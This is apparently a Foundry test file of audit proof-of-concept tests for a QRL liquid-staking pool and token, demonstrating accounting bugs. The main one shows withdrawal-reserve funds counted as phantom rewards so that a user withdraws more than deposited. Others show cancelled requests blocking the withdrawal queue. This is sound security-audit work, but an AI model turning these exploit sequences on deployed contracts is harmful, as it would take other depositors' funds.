// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "../contracts/solidity/stQRL-v2.sol";
import "../contracts/solidity/DepositPool-v2.sol";

/**
 * @title Audit PoC Tests
 * @notice Proof of concept tests for vulnerabilities found during audit
 */
contract AuditPoC is Test {
    stQRLv2 public token;
    DepositPoolV2 public pool;

    address public owner;
    address public user1;
    address public user2;
    address public attacker;

    function setUp() public {
        owner = address(this);
        user1 = address(0x1);
        user2 = address(0x2);
        attacker = address(0x3);

        token = new stQRLv2();
        pool = new DepositPoolV2();

        pool.setStQRL(address(token));
        token.setDepositPool(address(pool));

        vm.deal(user1, 100000 ether);
        vm.deal(user2, 100000 ether);
        vm.deal(attacker, 100000 ether);
    }

    // =========================================================================
    //  FINDING 1: syncRewards in claimWithdrawal causes withdrawal reserve
    //  to be misinterpreted as rewards, inflating subsequent claims
    // =========================================================================

    function test_PoC_SyncRewardsInflation() public {
        console.log("=== PoC: syncRewards inflation via withdrawal reserve ===");
        console.log("");

        // Step 1: User1 and User2 both deposit 100 QRL each
        vm.prank(user1);
        pool.deposit{value: 100 ether}();

        vm.prank(user2);
        pool.deposit{value: 100 ether}();

        console.log("After deposits:");
        console.log("  totalPooledQRL:", token.totalPooledQRL());
        console.log("  totalShares:", token.totalShares());
        console.log("  withdrawalReserve:", pool.withdrawalReserve());
        console.log("  contract balance:", address(pool).balance);
        console.log("");

        // Step 2: Fund the withdrawal reserve by reclassifying 200 QRL from totalPooledQRL
        pool.fundWithdrawalReserve(200 ether);

        console.log("After funding withdrawal reserve:");
        console.log("  totalPooledQRL:", token.totalPooledQRL());
        console.log("  withdrawalReserve:", pool.withdrawalReserve());
        console.log("  contract balance:", address(pool).balance);
        console.log("");

        // Step 3: Both users request withdrawal of 50 shares each
        vm.prank(user1);
        pool.requestWithdrawal(50 ether);

        vm.prank(user2);
        pool.requestWithdrawal(50 ether);

        console.log("After both withdrawal requests:");
        console.log("  totalPooledQRL:", token.totalPooledQRL());
        console.log("  totalWithdrawalShares:", pool.totalWithdrawalShares());
        console.log("  withdrawalReserve:", pool.withdrawalReserve());
        console.log("  contract balance:", address(pool).balance);
        console.log("");

        // Step 4: Wait for delay
        vm.roll(block.number + 129);

        // Step 5: User1 claims withdrawal
        uint256 user1BalanceBefore = user1.balance;
        vm.prank(user1);
        uint256 user1Claimed = pool.claimWithdrawal();

        console.log("After user1 claims:");
        console.log("  user1 claimed:", user1Claimed);
        console.log("  totalPooledQRL:", token.totalPooledQRL());
        console.log("  withdrawalReserve:", pool.withdrawalReserve());
        console.log("  contract balance:", address(pool).balance);
        console.log("  totalShares:", token.totalShares());
        console.log("");

        // Step 6: User2 claims withdrawal - what happens?
        // The _syncRewards() call in claimWithdrawal will now compare:
        //   actualTotalPooled = balance - withdrawalReserve
        //   vs previousPooled = totalPooledQRL
        // After user1's claim:
        //   balance decreased by user1Claimed
        //   withdrawalReserve decreased by user1Claimed
        //   totalPooledQRL decreased by user1Claimed
        // So these should stay balanced... let's verify

        uint256 balanceBeforeUser2 = address(pool).balance;
        uint256 reserveBeforeUser2 = pool.withdrawalReserve();
        uint256 pooledBeforeUser2 = token.totalPooledQRL();

        console.log("Before user2 claims:");
        console.log("  balance:", balanceBeforeUser2);
        console.log("  reserve:", reserveBeforeUser2);
        console.log("  balance - reserve (actualPooled):", balanceBeforeUser2 - reserveBeforeUser2);
        console.log("  totalPooledQRL (previousPooled):", pooledBeforeUser2);

        uint256 user2BalanceBefore = user2.balance;
        vm.prank(user2);
        uint256 user2Claimed = pool.claimWithdrawal();

        console.log("After user2 claims:");
        console.log("  user2 claimed:", user2Claimed);
        console.log("  totalPooledQRL:", token.totalPooledQRL());
        console.log("  withdrawalReserve:", pool.withdrawalReserve());
        console.log("  contract balance:", address(pool).balance);
        console.log("");

        console.log("RESULT:");
        console.log("  user1 should have claimed 50 ether, claimed:", user1Claimed);
        console.log("  user2 should have claimed 50 ether, claimed:", user2Claimed);

        if (user2Claimed > user1Claimed) {
            console.log("  BUG CONFIRMED: user2 extracted MORE than user1!");
            console.log("  Excess extracted:", user2Claimed - user1Claimed);
        }
    }

    // =========================================================================
    //  FINDING 2: FIFO skip via cancelled withdrawal creates permanently
    //  stuck queue entries that block all future claims
    // =========================================================================

    function test_PoC_CancelledWithdrawalBlocksFIFO() public {
        console.log("=== PoC: FIFO skip via cancelled withdrawal ===");
        console.log("");

        // Step 1: User deposits
        vm.prank(user1);
        pool.deposit{value: 100 ether}();

        // Fund reserve (reclassify deposited QRL)
        pool.fundWithdrawalReserve(100 ether);

        // Step 2: User creates 3 withdrawal requests
        vm.startPrank(user1);
        pool.requestWithdrawal(10 ether); // request 0
        pool.requestWithdrawal(10 ether); // request 1
        pool.requestWithdrawal(10 ether); // request 2
        vm.stopPrank();

        console.log("Created 3 withdrawal requests");
        console.log("  nextWithdrawalIndex:", pool.nextWithdrawalIndex(user1));

        // Step 3: User cancels request 0 (the next one to be claimed)
        vm.prank(user1);
        pool.cancelWithdrawal(0);

        console.log("After cancelling request 0:");
        console.log("  nextWithdrawalIndex:", pool.nextWithdrawalIndex(user1));

        // Step 4: Wait for delay
        vm.roll(block.number + 129);

        // Step 5: Try to claim - this should try to claim request 0 which is cancelled
        // The request has shares=0 and claimed=true, so it should revert
        vm.prank(user1);
        try pool.claimWithdrawal() {
            console.log("  Claim succeeded (request 0 was skipped)");
        } catch {
            console.log(
                "  BUG CONFIRMED: claimWithdrawal REVERTS because request 0 is cancelled but nextWithdrawalIndex still points to it!"
            );
            console.log("  Requests 1 and 2 are PERMANENTLY stuck in the queue");
        }
    }

    // =========================================================================
    //  FINDING 3: Share value inflation between request and claim
    //  User requests withdrawal, rewards accrue, user claims at new higher rate
    //  while the qrlAmount recorded at request time is stale
    // =========================================================================

    function test_PoC_WithdrawalValueDrift() public {
        console.log("=== PoC: Withdrawal value drift between request and claim ===");
        console.log("");

        // Step 1: User deposits 100 QRL
        vm.prank(user1);
        pool.deposit{value: 100 ether}();

        // Fund reserve (reclassify deposited QRL)
        pool.fundWithdrawalReserve(100 ether);

        console.log("After deposit:");
        console.log("  user1 shares:", token.sharesOf(user1));
        console.log("  totalPooledQRL:", token.totalPooledQRL());

        // Step 2: Request withdrawal of ALL 100 shares
        vm.prank(user1);
        (uint256 requestId, uint256 requestedQrl) = pool.requestWithdrawal(100 ether);

        console.log("Withdrawal requested:");
        console.log("  requestId:", requestId);
        console.log("  qrlAmount at request time:", requestedQrl);

        // Step 3: Rewards arrive (50 QRL) before claim
        vm.deal(address(pool), address(pool).balance + 50 ether);
        pool.syncRewards();

        console.log("After 50 QRL rewards:");
        console.log("  totalPooledQRL:", token.totalPooledQRL());
        console.log("  user1 shares value:", token.getPooledQRLByShares(100 ether));

        // Step 4: Wait and claim
        vm.roll(block.number + 129);

        uint256 balBefore = user1.balance;
        vm.prank(user1);
        uint256 claimed = pool.claimWithdrawal();

        console.log("Claimed:");
        console.log("  Amount claimed:", claimed);
        console.log("  Amount at request time:", requestedQrl);

        if (claimed > requestedQrl) {
            console.log("  FINDING: User received MORE than the qrlAmount recorded at request time!");
            console.log("  Extra received:", claimed - requestedQrl);
            console.log("  This is by design (shares are burned at current rate), but the");
            console.log("  WithdrawalRequest.qrlAmount field is misleading/stale");
        }
    }

    // =========================================================================
    //  FINDING 4: syncRewards in claimWithdrawal double-counts reserve changes
    //  The withdrawal reserve is funded by external transfers. When claimWithdrawal
    //  calls _syncRewards() AFTER unlocking/burning but BEFORE decrementing reserve,
    //  the accounting may be off.
    // =========================================================================

    function test_PoC_SyncRewardsWithFundValidatorMVP() public {
        console.log("=== PoC: syncRewards after fundValidatorMVP ===");
        console.log("");

        // Step 1: Deposit enough to fund a validator
        vm.deal(user1, 50000 ether);
        vm.prank(user1);
        pool.deposit{value: 40000 ether}();

        console.log("After deposit:");
        console.log("  totalPooledQRL:", token.totalPooledQRL());
        console.log("  bufferedQRL:", pool.bufferedQRL());
        console.log("  contract balance:", address(pool).balance);

        // Step 2: Fund validator (MVP - QRL stays in contract)
        pool.fundValidatorMVP();

        console.log("After fundValidatorMVP:");
        console.log("  totalPooledQRL:", token.totalPooledQRL());
        console.log("  bufferedQRL:", pool.bufferedQRL());
        console.log("  contract balance:", address(pool).balance);

        // Step 3: syncRewards should see no change
        // balance = 40000, reserve = 0, actualPooled = 40000 - 0 = 40000
        // previousPooled = 40000 -> no rewards detected. Good.
        pool.syncRewards();
        console.log("After syncRewards:");
        console.log("  totalPooledQRL:", token.totalPooledQRL());
        console.log("  totalRewardsReceived:", pool.totalRewardsReceived());
    }

    // =========================================================================
    //  FINDING 5: Unbounded withdrawal array growth / DoS
    // =========================================================================

    function test_PoC_UnboundedWithdrawalArray() public {
        console.log("=== PoC: Unbounded withdrawal array growth ===");
        console.log("");

        // Deposit
        vm.prank(user1);
        pool.deposit{value: 1000 ether}();

        // Create many withdrawal requests
        uint256 gasStart = gasleft();
        vm.startPrank(user1);
        for (uint256 i = 0; i < 100; i++) {
            pool.requestWithdrawal(1 ether);
        }
        vm.stopPrank();
        uint256 gasUsed = gasStart - gasleft();

        console.log("Created 100 withdrawal requests");
        console.log("  Gas used:", gasUsed);
        (uint256 total, uint256 pending) = pool.getWithdrawalRequestCount(user1);
        console.log("  Total requests:", total);
        console.log("  Pending requests:", pending);

        // Fund reserve (reclassify deposited QRL)
        pool.fundWithdrawalReserve(1000 ether);

        // Wait for delay
        vm.roll(block.number + 129);

        // Must claim one by one in FIFO order
        vm.startPrank(user1);
        uint256 claimGasStart = gasleft();
        pool.claimWithdrawal(); // Claim first one
        uint256 claimGas = claimGasStart - gasleft();
        vm.stopPrank();

        console.log("  Gas to claim 1 withdrawal:", claimGas);
        console.log("  User must call claimWithdrawal 100 times to claim all");
    }

    // =========================================================================
    //  KEY FINDING: claimWithdrawal syncRewards accounting bug
    //  When claimWithdrawal calls _syncRewards(), the burned shares have
    //  already reduced totalShares/totalPooledQRL's denominator, but
    //  the ETH hasn't been transferred yet. Let me trace precisely.
    // =========================================================================

    function test_PoC_ClaimSyncRewardsOrdering() public {
        console.log("=== PoC: Precise trace of claimWithdrawal + syncRewards ===");
        console.log("");

        // Setup: Two users deposit equally
        vm.prank(user1);
        pool.deposit{value: 100 ether}();
        vm.prank(user2);
        pool.deposit{value: 100 ether}();

        // Fund withdrawal reserve (reclassify 100 of the 200 deposited QRL)
        pool.fundWithdrawalReserve(100 ether);

        console.log("State after setup:");
        console.log("  contract balance:", address(pool).balance); // 200
        console.log("  totalPooledQRL:", token.totalPooledQRL()); // 200
        console.log("  withdrawalReserve:", pool.withdrawalReserve()); // 100
        console.log("  balance - reserve:", address(pool).balance - pool.withdrawalReserve()); // 200
        console.log("");

        // User1 requests withdrawal of 100 shares (all their shares)
        vm.prank(user1);
        pool.requestWithdrawal(100 ether);

        vm.roll(block.number + 129);

        // Now user1 claims. Let's trace what happens:
        // 1. _syncRewards() is called:
        //    - balance = 300 ether
        //    - actualTotalPooled = 300 - 100 (reserve) = 200
        //    - previousPooled = 200 (totalPooledQRL)
        //    - No change -> OK
        //
        // 2. unlockShares(user1, 100 ether) - unlocks shares
        //
        // 3. burnShares(user1, 100 ether) -> returns qrlAmount
        //    - qrlAmount = 100 * (200 + 1000) / (200 + 1000) ~= 100 ether (with tiny virtual rounding)
        //    - _totalShares becomes 100 ether
        //    - _shares[user1] becomes 0
        //    NOTE: totalPooledQRL is NOT yet updated
        //
        // 4. Check reserve: 100 >= qrlAmount -> OK
        //
        // 5. State changes:
        //    - withdrawalReserve -= qrlAmount -> now 0
        //    - totalPooledQRL update: current is 200, new = 200 - qrlAmount = 100
        //
        // 6. Transfer qrlAmount to user1
        //    - balance drops to 200

        console.log("Before user1 claim:");
        console.log("  balance:", address(pool).balance);

        uint256 user1BalBefore = user1.balance;
        vm.prank(user1);
        uint256 user1Got = pool.claimWithdrawal();

        console.log("After user1 claim:");
        console.log("  user1 received:", user1Got);
        console.log("  contract balance:", address(pool).balance);
        console.log("  totalPooledQRL:", token.totalPooledQRL());
        console.log("  totalShares:", token.totalShares());
        console.log("  withdrawalReserve:", pool.withdrawalReserve());
        console.log("  balance - reserve (actualPooled):", address(pool).balance - pool.withdrawalReserve());
        console.log("  user2 shares:", token.sharesOf(user2));
        console.log("  user2 QRL value:", token.getQRLValue(user2));
        console.log("");

        // After user1 claims:
        //   balance = 200
        //   withdrawalReserve = 0
        //   totalPooledQRL = 100
        //   actualPooled = balance - reserve = 200 - 0 = 200
        //   BUT totalPooledQRL = 100
        //   So next syncRewards will see 200 > 100 and attribute 100 as "rewards"!
        //   This is a BUG - the 100 excess is from the funded reserve that hasn't been claimed yet!

        console.log("CRITICAL CHECK:");
        console.log("  actualPooled (balance - reserve):", address(pool).balance - pool.withdrawalReserve());
        console.log("  totalPooledQRL:", token.totalPooledQRL());

        uint256 phantomRewards = (address(pool).balance - pool.withdrawalReserve()) - token.totalPooledQRL();
        if (phantomRewards > 0) {
            console.log("  PHANTOM REWARDS DETECTED:", phantomRewards);
            console.log("  Next syncRewards() will attribute this as rewards!");
        }

        // Trigger the exploit - syncRewards detects phantom rewards
        pool.syncRewards();

        console.log("");
        console.log("After syncRewards:");
        console.log("  totalPooledQRL:", token.totalPooledQRL());
        console.log("  user2 shares:", token.sharesOf(user2));
        console.log("  user2 QRL value:", token.getQRLValue(user2));
        console.log("  totalRewardsReceived:", pool.totalRewardsReceived());

        // User2 now tries to withdraw all their shares
        pool.fundWithdrawalReserve(token.totalPooledQRL());

        vm.prank(user2);
        pool.requestWithdrawal(100 ether);

        vm.roll(block.number + 260);

        uint256 user2BalBefore = user2.balance;
        vm.prank(user2);
        uint256 user2Got = pool.claimWithdrawal();

        console.log("");
        console.log("FINAL RESULT:");
        console.log("  user1 deposited 100 QRL, got back:", user1Got);
        console.log("  user2 deposited 100 QRL, got back:", user2Got);
        console.log("  Total deposited: 200 ether");
        console.log("  Total withdrawn:", user1Got + user2Got);

        if (user2Got > 100 ether) {
            console.log("  BUG CONFIRMED: user2 extracted more than deposited!");
            console.log("  Excess:", user2Got - 100 ether);
            console.log("  This came from the withdrawal reserve being misattributed as rewards");
        }
    }

    // =========================================================================
    //  FINDING: Cancelled middle request blocks FIFO queue
    // =========================================================================

    function test_PoC_CancelMiddleRequestBlocksQueue() public {
        console.log("=== PoC: Cancel a request that is NOT the head of the queue ===");
        console.log("");

        vm.prank(user1);
        pool.deposit{value: 100 ether}();
        pool.fundWithdrawalReserve(100 ether);

        // Create 3 requests
        vm.startPrank(user1);
        pool.requestWithdrawal(10 ether); // request 0 (head)
        pool.requestWithdrawal(20 ether); // request 1
        pool.requestWithdrawal(10 ether); // request 2
        vm.stopPrank();

        // Cancel request 1 (middle)
        vm.prank(user1);
        pool.cancelWithdrawal(1);

        // Wait
        vm.roll(block.number + 129);

        // Claim request 0 - should work
        vm.prank(user1);
        uint256 claimed0 = pool.claimWithdrawal();
        console.log("Claimed request 0:", claimed0);
        console.log("  nextWithdrawalIndex:", pool.nextWithdrawalIndex(user1));

        // Now nextWithdrawalIndex points to request 1, which is cancelled (shares=0, claimed=true)
        // claimWithdrawal will try to process request 1, see shares=0, and revert
        vm.prank(user1);
        try pool.claimWithdrawal() {
            console.log("Claim for cancelled request succeeded");
        } catch {
            console.log("BUG CONFIRMED: Request 1 (cancelled) blocks request 2 in the FIFO queue!");
            console.log("  Request 2 (10 shares) is permanently stuck");
        }
    }
}
